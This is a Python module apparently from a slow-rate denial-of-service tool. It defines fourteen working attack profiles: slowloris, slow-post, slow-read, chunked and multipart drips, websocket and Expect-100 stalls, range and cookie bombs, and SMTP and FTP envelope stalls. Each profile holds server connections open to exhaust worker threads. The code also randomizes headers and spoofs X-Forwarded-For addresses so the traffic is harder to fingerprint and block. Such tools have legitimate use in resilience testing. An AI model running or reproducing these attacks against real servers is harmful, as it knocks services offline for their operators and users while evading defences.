"""Attack profiles.

Each profile opens one connection and slowly consumes it so that a
vulnerable web server ties up a worker thread/process waiting on it:

* ``slow-post``   - send headers with a big Content-Length, then drip the
                    body one byte at a time (classic Tor's Hammer).
* ``slow-headers``- never finish the request headers (slowloris).
* ``slow-read``   - send a full request, then read the response in tiny
                    chunks with pauses (slow-read / slow-bytes).
* ``chunked``     - send POST with Transfer-Encoding: chunked and drip
                    small chunks without the terminating 0-chunk.
* ``multipart-slow-upload`` - send a multipart/form-data POST and dribble
                    MIME part bytes slowly, never emitting the closing
                    boundary (exercises multipart parsers/temp-file handling).
* ``expect-continue-abuse`` - send headers with ``Expect: 100-continue`` and
                    stall the body after the interim response, keeping any
                    state the server allocated on ``100 Continue`` pinned.

Every connection randomizes its headers, User-Agent, path query and timing
to make the traffic harder to fingerprint.
"""

from __future__ import annotations

import asyncio
import random
import secrets
import string
from abc import ABC, abstractmethod

from .config import Config
from .stats import Stats

_ALNUM = string.ascii_letters + string.digits
_ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
]


def _rand_ip() -> str:
    return ".".join(str(random.randint(0, 255)) for _ in range(4))


def _rand_token(length: int = 8) -> str:
    return "".join(random.choice(_ALNUM) for _ in range(length))


def _rand_hex(length: int = 12) -> str:
    return "".join(random.choice("0123456789abcdef") for _ in range(length))


def _random_header_name(name: str) -> str:
    return "".join(
        ch.upper() if random.random() < 0.5 else ch.lower() if ch.isalpha() else ch for ch in name
    )


def _path(config: Config) -> str:
    if not config.randomize_path:
        return config.path
    separator = "&" if "?" in config.path else "?"
    random_token = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(9))
    return f"{config.path}{separator}{random_token}"


def _base_headers(config: Config, ua: str) -> list[str]:
    headers = [
        f"Host: {config.header_host}",
        f"User-Agent: {ua}",
        f"Accept: {random.choice(_ACCEPTS)}",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate",
        "Connection: keep-alive",
        "Keep-Alive: 900",
        "X-Requested-With: XMLHttpRequest",
    ]
    if random.random() < 0.5:
        headers.append(f"Referer: https://{config.header_host}/")
    if random.random() < 0.35:
        headers.append("Cache-Control: no-cache")
    if random.random() < 0.25:
        headers.append("DNT: 1")
    if random.random() < 0.25:
        headers.append("TE: trailers, deflate")
    if random.random() < 0.5:
        headers.append(f"X-Forwarded-For: {_rand_ip()}")
    if random.random() < 0.4:
        headers.append(f"X-Trace-Id: {secrets.token_hex(6)}")

    # Add custom headers.
    # custom_headers may be either a dict[str,str] (normal case) or a list[str]
    # (pre-formatted 'Name: Value' strings for programmatic override).
    custom = config.custom_headers
    if isinstance(custom, dict):
        # CLI-sourced: Host and Connection are structural and must not be
        # overridden (they would corrupt request framing). Any other header,
        # including User-Agent and Accept, replaces its default line so the
        # explicit value wins without producing duplicates.
        protected = {"host", "connection"}
        canonical_names = {
            "user-agent": "User-Agent",
            "accept": "Accept",
            "accept-language": "Accept-Language",
            "accept-encoding": "Accept-Encoding",
        }
        replacements: dict[str, str] = {}
        extras: list[str] = []
        for name, value in custom.items():
            lower = name.lower()
            if lower in protected:
                continue
            canonical = canonical_names.get(lower)
            if canonical:
                replacements[canonical] = value
            else:
                extras.append(f"{name}: {value}")
        rebuilt: list[str] = []
        for header in headers:
            key = header.split(":", 1)[0]
            if key in replacements:
                rebuilt.append(f"{key}: {replacements.pop(key)}")
            else:
                rebuilt.append(header)
        headers = rebuilt + extras
    elif isinstance(custom, list):
        # Programmatic list: caller takes full responsibility; no filter applied.
        for header in custom:
            headers.append(header)

    return headers


def _dribble(n: int = 1) -> bytes:
    return "".join(random.choice(_ALNUM) for _ in range(n)).encode()


async def _write(writer: asyncio.StreamWriter, data: bytes, stats: Stats, config: Config) -> None:
    writer.write(data)
    try:
        await asyncio.wait_for(writer.drain(), timeout=config.connect_timeout * 2)
    except TimeoutError:
        raise ConnectionError("write drain timed out")
    stats.bytes_sent += len(data)


async def _halt(stop: asyncio.Event, config: Config) -> None:
    """Sleep a random delay, but wake early if ``stop`` is set."""
    try:
        await asyncio.wait_for(stop.wait(), timeout=config.random_delay())
    except TimeoutError:
        pass


class Profile(ABC):
    """Base class for attack profiles."""

    name = ""

    @abstractmethod
    async def run(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        config: Config,
        ua: str,
        stats: Stats,
        stop: asyncio.Event,
    ) -> bool:
        """Dribble the connection until ``stop`` fires or the profile ends.

        Returns:
            True if the profile completed successfully, False if interrupted by stop flag.
        """


class SlowPost(Profile):
    name = "slow-post"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Use custom body if provided, otherwise generate random body
        if config.custom_body:
            body = config.custom_body
            length = len(body)
        else:
            length = random.randint(config.base_post_length // 2, config.base_post_length)
            body = None  # Will dribble random data

        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {length}")
        req = (
            f"{config.method or 'POST'} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats, config)
        sent = 0
        while not stop.is_set() and sent < length:
            await _write(writer, _dribble(), stats, config)
            sent += 1
            await _halt(stop, config)


class SlowPostHeaders(Profile):
    name = "slow-post-headers"

    async def run(self, reader, writer, config, ua, stats, stop):
        length = random.randint(config.base_post_length // 2, config.base_post_length)
        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {length}")
        lines = [f"{config.method or 'POST'} {_path(config)} HTTP/1.1"] + headers
        while lines and not stop.is_set():
            await _write(writer, (lines.pop(0) + "\r\n").encode(), stats, config)
            await _halt(stop, config)
        if not stop.is_set():
            await _write(writer, b"\r\n", stats, config)
        sent = 0
        while not stop.is_set() and sent < length:
            await _write(writer, _dribble(), stats, config)
            sent += 1
            await _halt(stop, config)


class SlowHeaders(Profile):
    name = "slow-headers"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Send the request line with the Host/UA headers but never the
        # terminating blank line, so the request stays "in progress".
        method = config.method or "GET"
        req = f"{method} {_path(config)} HTTP/1.1\r\n".encode()
        await _write(writer, req, stats, config)
        # Send custom headers first (if any), then random X-headers
        if config.custom_headers:
            for header in config.custom_headers:
                await _write(writer, (header + "\r\n").encode(), stats, config)
                await _halt(stop, config)
        while not stop.is_set():
            key = f"X-{_rand_hex(6)}"
            value = _rand_hex(8)
            await _write(writer, f"{key}: {value}\r\n".encode(), stats, config)
            await _halt(stop, config)
        return not stop.is_set()  # True if completed, False if interrupted


class SlowRead(Profile):
    name = "slow-read"

    async def run(self, reader, writer, config, ua, stats, stop):
        headers = _base_headers(config, ua)
        req = (
            f"{config.method or 'GET'} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats, config)
        while not stop.is_set():
            try:
                chunk = await asyncio.wait_for(reader.read(8), timeout=config.connect_timeout * 2)
            except TimeoutError:
                continue
            if not chunk:  # server closed the connection
                break
            stats.bytes_received += len(chunk)
            await _halt(stop, config)
        return not stop.is_set()  # True if completed, False if interrupted


class Chunked(Profile):
    name = "chunked"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Use custom body if provided, otherwise generate random body
        if config.custom_body:
            body = config.custom_body
            length = len(body)
        else:
            length = random.randint(config.base_post_length // 2, config.base_post_length)
            body = None  # Will dribble random data

        headers = _base_headers(config, ua)
        headers.append("Transfer-Encoding: chunked")
        headers.append("Content-Type: application/x-www-form-urlencoded")
        req = (
            f"{config.method or 'POST'} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats, config)
        sent = 0
        while not stop.is_set() and sent < length:
            size = random.randint(1, 4)
            payload = _dribble(size)
            await _write(writer, f"{size:x}\r\n".encode() + payload + b"\r\n", stats, config)
            sent += size
            await _halt(stop, config)


class WebSocketSlowUpgrade(Profile):
    name = "websocket-slow-upgrade"

    async def run(self, reader, writer, config, ua, stats, stop):
        # WebSocket upgrade request with slow header sending
        method = config.method or "GET"
        headers = _base_headers(config, ua)
        # Add WebSocket-specific headers
        headers.append("Upgrade: websocket")
        headers.append("Connection: Upgrade")
        # Generate WebSocket key (random base64)
        import base64
        ws_key = base64.b64encode(secrets.token_bytes(16)).decode()
        headers.append(f"Sec-WebSocket-Key: {ws_key}")
        headers.append("Sec-WebSocket-Version: 13")
        if random.random() < 0.5:
            headers.append("Sec-WebSocket-Protocol: chat")

        # Send request line
        req = f"{method} {_path(config)} HTTP/1.1\r\n".encode()
        await _write(writer, req, stats, config)

        # Slowly send headers one by one
        for header in headers:
            if stop.is_set():
                return False
            await _write(writer, (header + "\r\n").encode(), stats, config)
            await _halt(stop, config)

        # Never send the terminating blank line to keep upgrade incomplete
        while not stop.is_set():
            # Continue sending random X-headers to keep connection alive
            key = f"X-{_rand_hex(6)}"
            value = _rand_hex(8)
            await _write(writer, f"{key}: {value}\r\n".encode(), stats, config)
            await _halt(stop, config)

        return not stop.is_set()


class HttpPipelining(Profile):
    name = "http-pipelining"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Send multiple HTTP requests without waiting for responses
        method = config.method or "GET"
        headers = _base_headers(config, ua)
        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()

        # Send multiple requests in pipeline
        request_count = 0
        while not stop.is_set() and request_count < 50:  # Limit to 50 requests per connection
            await _write(writer, req, stats, config)
            request_count += 1
            # Small delay between requests to keep connection alive
            await _halt(stop, config)

        return not stop.is_set()


class RangeHeaderAbuse(Profile):
    name = "range-abuse"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Send many byte range requests to exhaust file handle limits
        method = config.method or "GET"
        request_count = 0
        while not stop.is_set() and request_count < 100:  # Limit to 100 range requests per connection
            headers = _base_headers(config, ua)
            # Add random Range header
            start = random.randint(0, 1000000)
            end = start + random.randint(100, 10000)
            headers.append(f"Range: bytes={start}-{end}")

            req = (
                f"{method} {_path(config)} HTTP/1.1\r\n"
                + "\r\n".join(headers)
                + "\r\n\r\n"
            ).encode()

            await _write(writer, req, stats, config)
            request_count += 1
            # Small delay between requests
            await _halt(stop, config)

        return not stop.is_set()


class CookieBomb(Profile):
    name = "cookie-bomb"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Send extremely large cookies to exhaust cookie parsing memory
        method = config.method or "GET"
        headers = _base_headers(config, ua)

        # Generate large cookie value (10KB for testing, can be larger in production)
        cookie_size = 10 * 1024  # 10KB (reduced from 1MB for test performance)
        cookie_value = "".join(random.choice(_ALNUM) for _ in range(cookie_size))
        cookie_name = "bomb_cookie"

        # Replace existing cookie if present, or add new one
        headers = [h for h in headers if not h.lower().startswith("cookie:")]
        headers.append(f"Cookie: {cookie_name}={cookie_value}")

        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()

        await _write(writer, req, stats, config)

        # Keep connection alive with periodic keep-alive headers
        while not stop.is_set():
            await _halt(stop, config)
            # Send small keep-alive data to maintain connection
            if random.random() < 0.1:  # 10% chance to send keep-alive
                await _write(writer, b"X-Keep-Alive: 1\r\n", stats, config)

        return not stop.is_set()


class JsonRpcSlow(Profile):
    name = "jsonrpc-slow"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Slowly send JSON-RPC payloads
        method = config.method or "POST"
        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/json")

        # Generate JSON-RPC payload (partial, never completed)
        json_payload = '{"jsonrpc":"2.0","method":"slow_method","params":['
        json_length = len(json_payload)

        headers.append(f"Content-Length: {json_length + 1000}")  # Claim larger size
        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()

        await _write(writer, req, stats, config)

        # Slowly send JSON payload character by character
        sent = 0
        while not stop.is_set() and sent < len(json_payload):
            await _write(writer, json_payload[sent:sent+1].encode(), stats, config)
            sent += 1
            await _halt(stop, config)

        # Continue sending partial JSON data without completion
        while not stop.is_set():
            await _write(writer, b'"param",', stats, config)
            await _halt(stop, config)

        return not stop.is_set()


class SmtpSlowEnvelope(Profile):
    name = "smtp-slow-envelope"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Slowly send SMTP envelope commands
        # SMTP operates on different ports, but we'll use the configured port
        smtp_commands = [
            f"EHLO {config.header_host}",
            "MAIL FROM: <slow-test@example.com>",
            "RCPT TO: <recipient@example.com>",
        ]

        for cmd in smtp_commands:
            if stop.is_set():
                return False
            await _write(writer, (cmd + "\r\n").encode(), stats, config)
            await _halt(stop, config)

        # Never send DATA command to keep envelope incomplete
        while not stop.is_set():
            # Continue sending incomplete RCPT TO commands
            await _write(writer, b"RCPT TO: <another@example.com>\r\n", stats, config)
            await _halt(stop, config)

        return not stop.is_set()


class FtpSlowCommand(Profile):
    name = "ftp-slow-command"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Slowly send FTP commands
        ftp_commands = [
            "USER anonymous",
            "PASS test@example.com",
            "PASV",
        ]

        for cmd in ftp_commands:
            if stop.is_set():
                return False
            await _write(writer, (cmd + "\r\n").encode(), stats, config)
            await _halt(stop, config)

        # Never complete data transfer
        while not stop.is_set():
            # Continue sending PASV commands
            await _write(writer, b"PASV\r\n", stats, config)
            await _halt(stop, config)

        return not stop.is_set()


def _multipart_boundary() -> str:
    """Random 24-character multipart boundary (alphanumeric only)."""
    return "".join(random.choice(_ALNUM) for _ in range(24))


class MultipartSlowUpload(Profile):
    name = "multipart-slow-upload"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Multipart uploads exercise a different parser/handling path than the
        # opaque bodies sent by slow-post/chunked (boundary scanning, part
        # buffering, temp-file handling on real upload endpoints). Emit the
        # headers line by line, then dribble MIME-part content forever,
        # withholding the closing boundary so the upload never completes.
        boundary = _multipart_boundary()
        ctype = f"multipart/form-data; boundary=----WebKitFormBoundary{boundary}"

        headers = _base_headers(config, ua)
        # `--header Expect:...` must not leak into multipart (it would turn
        # the upload into an expect/continue transaction), mirroring Rust.
        headers = [
            h for h in headers if h.split(":", 1)[0].strip().lower() != "expect"
        ]
        headers.append(f"Content-Type: {ctype}")
        headers.append(f"Content-Length: {config.base_post_length}")
        lines = [f"{config.method or 'POST'} {_path(config)} HTTP/1.1"] + headers
        while lines and not stop.is_set():
            await _write(writer, (lines.pop(0) + "\r\n").encode(), stats, config)
            await _halt(stop, config)
        if stop.is_set():
            return False
        await _write(writer, b"\r\n", stats, config)
        if stop.is_set():
            return False

        # A realistic file-upload preamble, then endless slow part content
        # with only non-closing boundaries so the body never terminates.
        prelude = (
            f"------WebKitFormBoundary{boundary}\r\n"
            'Content-Disposition: form-data; name="upload"; '
            f'filename="{_rand_token(10)}.bin"\r\n'
            "Content-Type: application/octet-stream\r\n\r\n"
        ).encode()
        await _write(writer, prelude, stats, config)
        part = 0
        while not stop.is_set():
            await _write(writer, _dribble(), stats, config)
            part += 1
            if part % 64 == 0:
                # Emit a fresh non-final boundary every so often: it keeps
                # multipart parsers scanning and buffering without ever
                # signalling the end of the upload.
                chunk = (
                    f"\r\n------WebKitFormBoundary{boundary}\r\n"
                    f'Content-Disposition: form-data; name="field{part}"\r\n'
                    "\r\n"
                ).encode()
                await _write(writer, chunk, stats, config)
            await _halt(stop, config)
        return not stop.is_set()


class ExpectContinueAbuse(Profile):
    name = "expect-continue-abuse"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Announce a body with `Expect: 100-continue`, consume the interim
        # response if the server sends one, then stall the body itself. Any
        # state the server allocated on its `100 Continue` decision (worker,
        # upload buffer) stays pinned while the connection is held open.
        length = random.randint(config.base_post_length // 2, config.base_post_length)

        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {length}")
        # A caller-supplied `Expect:` (via --header) wins over the default,
        # mirroring the Rust backend (no duplicate lines either way).
        lowered = [h.split(":", 1)[0].strip().lower() for h in headers]
        if "expect" not in lowered:
            headers.append("Expect: 100-continue")
        req = (
            f"{config.method or 'POST'} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats, config)
        # Give the server a beat to answer with `100 Continue` (or a final
        # rejection); consume whatever arrived without blocking past the
        # configured read deadline, then keep the promised body stalled.
        try:
            interim = await asyncio.wait_for(reader.read(1024), timeout=config.connect_timeout)
        except TimeoutError:
            interim = b""
        if interim:
            stats.bytes_received += len(interim)
        if stop.is_set():
            return False

        sent = 0
        while not stop.is_set() and sent < length:
            await _write(writer, _dribble(), stats, config)
            sent += 1
            await _halt(stop, config)
        # Even after the announced byte count is exhausted, hold the socket
        # open instead of closing it.
        while not stop.is_set():
            await _halt(stop, config)
        return not stop.is_set()


PROFILES: dict[str, type[Profile]] = {
    SlowPost.name: SlowPost,
    SlowPostHeaders.name: SlowPostHeaders,
    SlowHeaders.name: SlowHeaders,
    SlowRead.name: SlowRead,
    Chunked.name: Chunked,
    WebSocketSlowUpgrade.name: WebSocketSlowUpgrade,
    HttpPipelining.name: HttpPipelining,
    RangeHeaderAbuse.name: RangeHeaderAbuse,
    CookieBomb.name: CookieBomb,
    JsonRpcSlow.name: JsonRpcSlow,
    SmtpSlowEnvelope.name: SmtpSlowEnvelope,
    FtpSlowCommand.name: FtpSlowCommand,
    MultipartSlowUpload.name: MultipartSlowUpload,
    ExpectContinueAbuse.name: ExpectContinueAbuse,
}
